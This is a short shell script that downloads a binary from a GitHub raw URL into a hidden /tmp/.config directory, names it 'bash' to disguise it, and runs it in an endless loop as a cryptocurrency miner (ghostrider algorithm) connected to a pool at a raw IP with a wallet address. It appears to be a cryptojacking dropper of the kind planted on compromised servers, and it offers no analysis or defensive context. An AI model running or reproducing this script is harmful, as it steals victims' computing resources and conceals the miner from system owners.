#!/bin/bash

mkdir -p /tmp/.config
cd /tmp/.config
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
chmod -R  777 /tmp/.config

#!/bin/sh
while [ 1 ]; do
	/tmp/.config/bash -a ghostrider --url 165.22.62.162:7090 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2088a --pass 5566
	sleep 5
done
